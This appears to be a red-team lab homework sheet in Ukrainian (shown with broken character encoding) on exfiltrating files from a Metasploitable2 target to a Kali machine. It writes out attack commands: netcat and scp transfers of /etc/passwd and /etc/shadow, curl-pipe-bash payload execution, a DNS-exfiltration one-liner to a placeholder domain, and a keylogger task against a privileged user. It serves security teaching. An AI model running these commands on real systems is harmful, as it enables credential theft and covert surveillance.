
# üõ°Ô∏è Lab 7: –î–æ–º–∞—à–Ω—î –ó–∞–≤–¥–∞–Ω–Ω—è: –ï–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è —Ç–∞ –ü–µ—Ä–µ–¥–∞—á–∞ –î–∞–Ω–∏—Ö (Red Team –ø—Ä–∞–∫—Ç–∏–∫—É–º)

–¶–µ–π –±–ª–æ–∫ –¥–æ–º–∞—à–Ω—ñ—Ö –∑–∞–≤–¥–∞–Ω—å –æ—Ä—ñ—î–Ω—Ç–æ–≤–∞–Ω–∏–π –Ω–∞ –ø—Ä–∞–∫—Ç–∏—á–Ω–µ –≤—ñ–¥–ø—Ä–∞—Ü—é–≤–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ–∫ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó —Ñ–∞–π–ª—ñ–≤ —ñ–∑ Metasploitable2 –∞–±–æ —ñ–Ω—à–∏—Ö —Ü—ñ–ª—å–æ–≤–∏—Ö –º–∞—à–∏–Ω —É –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö. –ö–æ–∂–Ω–µ –∑–∞–≤–¥–∞–Ω–Ω—è **–º–∞—î –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–µ, –∑–∞–¥–æ–∫—É–º–µ–Ω—Ç–æ–≤–∞–Ω–µ** —ñ –º—ñ—Å—Ç–∏—Ç–∏:

---

## üì¶ –ó–∞–≤–¥–∞–Ω–Ω—è 1: –ï–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è —á–µ—Ä–µ–∑ Netcat

**–ú–µ—Ç–∞:** –ü–µ—Ä–µ–¥–∞—Ç–∏ —Ñ–∞–π–ª `/etc/passwd` –∑ Metasploitable2 –Ω–∞ Kali —á–µ—Ä–µ–∑ Netcat.

üîπ –ö–æ–º–∞–Ω–¥–∏:
- Kali:
  ```bash
  nc -lvnp 9000 > passwd_copy
  ```
- Metasploitable2:
  ```bash
  nc <kali_ip> 9000 < /etc/passwd
  ```

‚úÖ *–ù–∞–¥–∞—Ç–∏ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è, —â–æ —Ñ–∞–π–ª –æ—Ç—Ä–∏–º–∞–Ω–æ.*

---

## üåê –ó–∞–≤–¥–∞–Ω–Ω—è 2: –ü–µ—Ä–µ–¥–∞—á–∞ —á–µ—Ä–µ–∑ `curl | bash`

**–ú–µ—Ç–∞:** –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç –∑ Kali —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ –Ω–∞ Metasploitable2 –±–µ–∑ –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è.

üîπ Kali:
```bash
python3 -m http.server 80
```

üîπ Metasploitable2:
```bash
curl http://<kali_ip>/payload.sh | bash
```

‚úÖ *–í–∏–≤—ñ–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç–∞.*

---

## üîê –ó–∞–≤–¥–∞–Ω–Ω—è 3: –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è SCP

**–ú–µ—Ç–∞:** –ü–µ—Ä–µ–¥–∞—Ç–∏ —Ñ–∞–π–ª –∑ Metasploitable2 –Ω–∞ Kali –∞–±–æ –Ω–∞–≤–ø–∞–∫–∏.

üîπ –ó —Ç–∞—Ä–≥–µ—Ç–∞:
```bash
scp /etc/shadow kali@<kali_ip>:/tmp/shadow_copy
```

‚úÖ *–ü—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è. –Ø–∫—â–æ –Ω–µ –≤–¥–∞–ª–æ—Å—è ‚Äî –æ–ø–∏—Å–∞—Ç–∏ —á–æ–º—É (SSH, firewall, auth).*

---

## üß¨ –ó–∞–≤–¥–∞–Ω–Ω—è 4: Base64 –ø–µ—Ä–µ–¥–∞—á–∞ –≤—Ä—É—á–Ω—É

**–ú–µ—Ç–∞:** –ö–æ–¥—É–≤–∞—Ç–∏ —Ñ–∞–π–ª —É base64 –Ω–∞ Kali, –≤—Ä—É—á–Ω—É –≤—Å—Ç–∞–≤–∏—Ç–∏ –Ω–∞ Metasploitable2, –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏.

üîπ Kali:
```bash
base64 -w0 test.sh
```

üîπ Metasploitable2:
```bash
echo "<base64_string>" > file.b64
base64 -d file.b64 > restored.sh
chmod +x restored.sh
```

‚úÖ *–ü–æ–∫–∞–∑–∞—Ç–∏, —â–æ —Ñ–∞–π–ª –ø—Ä–∞—Ü—é—î.*

---

## üß† –ó–∞–≤–¥–∞–Ω–Ω—è 5: –Ø–∫—â–æ –Ω–µ–º–∞—î curl/wget ‚Äî –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Bash TCP `/dev/tcp`

**–ú–µ—Ç–∞:** –û—Ç—Ä–∏–º–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç –±–µ–∑ curl/wget —á–µ—Ä–µ–∑ `bash`.

üîπ Bash-—Ñ—É–Ω–∫—Ü—ñ—è:
```bash
function __wget() {
    ...
}
```

üîπ –ö–æ–º–∞–Ω–¥–∞:
```bash
__wget http://<kali_ip>/file.sh | bash
```

‚úÖ *–Ø–∫—â–æ –Ω–µ –ø—Ä–∞—Ü—é—î ‚Äî –ø–æ—è—Å–Ω–∏—Ç–∏.*

---

## üåê –ó–∞–≤–¥–∞–Ω–Ω—è 6: –ï–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è —á–µ—Ä–µ–∑ DNS (capture-only)

**–ú–µ—Ç–∞:** –ü–µ—Ä–µ–¥–∞—Ç–∏ –¥–∞–Ω—ñ –∑ Metasploitable2 —É –≤–∏–≥–ª—è–¥—ñ DNS-–∑–∞–ø–∏—Ç—ñ–≤ —ñ –ø–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ –Ω–∞ Kali.

üîπ Kali:
```bash
tcpdump -i any port 53 -w dnslog.pcap
```

üîπ Metasploitable2:
```bash
# Python-—Å–∫—Ä–∏–ø—Ç, —â–æ –≥–µ–Ω–µ—Ä—É—î DNS-–∑–∞–ø–∏—Ç–∏ –∑ –¥–∞–Ω–∏–º–∏
```

‚úÖ *–í–∏—Ç—è–≥—Ç–∏ –¥–∞–Ω—ñ –∑ pcap —á–µ—Ä–µ–∑ tshark –∞–±–æ –≤—Ä—É—á–Ω—É.*

---

## üöÄ –ó–∞–≤–¥–∞–Ω–Ω—è 7: –ü–µ—Ä–µ–¥–∞—á–∞ —á–µ—Ä–µ–∑ `croc`

**–ú–µ—Ç–∞:** –í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ `croc`, –ø–µ—Ä–µ–¥–∞—Ç–∏ —Ñ–∞–π–ª `shadow`, –æ—Ç—Ä–∏–º–∞—Ç–∏ –Ω–∞ Kali.

üîπ Metasploitable2:
```bash
curl https://getcroc.schollz.com | bash
croc send /etc/shadow
```

üîπ Kali:
```bash
croc <code>
```

‚úÖ *–§–∞–π–ª –ø–æ–≤–∏–Ω–µ–Ω –¥—ñ–π—Ç–∏ –ø–æ–≤–Ω—ñ—Å—Ç—é.*

---

## üì§ –ó–∞–≤–¥–∞–Ω–Ω—è 8: –í–ª–∞—Å–Ω–∏–π upload-—Å–µ—Ä–≤–µ—Ä + –ø–µ—Ä–µ–¥–∞—á–∞ —á–µ—Ä–µ–∑ curl –∑ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—î—é

**–ú–µ—Ç–∞:** –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑ Basic Auth.

üîπ Kali:
```bash
python3 upload_server.py  # Flask —Å–µ—Ä–≤–µ—Ä –∑ Basic Auth
```

üîπ Metasploitable2:
```bash
curl -u user:pass -F "files=@/etc/hostname" http://<kali_ip>:8000/upload
```

‚úÖ *–§–∞–π–ª –ø–æ–≤–∏–Ω–µ–Ω –∑‚Äô—è–≤–∏—Ç–∏—Å—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ.*

---

## üîë –ó–∞–≤–¥–∞–Ω–Ω—è 9: –†–µ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ —Ç–µ—Ö–Ω—ñ–∫—É Keylogger

**–ú–µ—Ç–∞:** –û—Ç—Ä–∏–º–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ —è–∫—ñ –≤–≤–æ–¥–∏—Ç–∏–º–µ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä msfadmin –∞–±–æ kali

üîπ –û—Ç—Ä–∏–º–∞—Ç–∏ PID —ñ–∑ —Ç–µ—Ä–º—ñ–Ω–∞–ª—É –Ω–µ –Ω–∞ –ø—Ä—è–º—É, –∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—é –¥–∞–Ω–∏—Ö –∞–±–æ —ñ–Ω—à–∏–π —Å–ø–æ—Å—ñ–±, —â–æ –¥–æ–∑–≤–æ–ª–∏—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ PID –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞

```bash
ps aux | grep -E 'bash|zsh' | grep -v $$ | grep -v grep | base64 | tr -d '\\n' | fold -w50 | while read x; do host $x.exfil.yourdomain.com; done

```
üîπ –ü—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—å –¥–æ —Ü—å–æ–≥–æ PID —Ç–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–∞–Ω—ñ —è–∫—ñ  –≤–≤–æ–¥–∏—Ç—å –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á.
üîπ –°–ø—Ä–æ–±—É–≤–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ –º–µ—Ç–æ–¥–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö, —è–∫ –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —É —Ñ–∞–π–ª —ñ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —á–µ—Ä–µ–∑ nc —Ç–∞–∫ —ñ —è–∫—ñ—Å—å –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏.

‚úÖ *–û—Ç—Ä–∏–º–∞–Ω–æ –∫–æ–º–∞–Ω–¥–∏ —ñ–∑ —Ç–µ—Ä–º—ñ–Ω–∞–ª—É*

---

## üìå –§–æ—Ä–º–∞—Ç –∑–≤—ñ—Ç—É:

–ö–æ–∂–Ω–µ –∑–∞–≤–¥–∞–Ω–Ω—è –æ—Ñ–æ—Ä–º–∏—Ç–∏ —É –≤–∏–≥–ª—è–¥—ñ:

```
### –ó–∞–≤–¥–∞–Ω–Ω—è X: –ù–∞–∑–≤–∞
‚úÖ –í–∏–≤—ñ–¥ / —Å–∫—Ä—ñ–Ω—à–æ—Ç
üß† –Ø–∫ –≤–∏—Ä—ñ—à—É–≤–∞–ª–∏
‚ùå –Ø–∫—â–æ –Ω–µ —Å–ø—Ä–∞—Ü—é–≤–∞–ª–æ ‚Äî —á–æ–º—É
üîÅ –Ü–Ω—à—ñ –≤–∞—Ä—ñ–∞–Ω—Ç–∏ (–æ–ø—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ)
```

---

–£—Å–ø—ñ—Ö—ñ–≤! üëæ
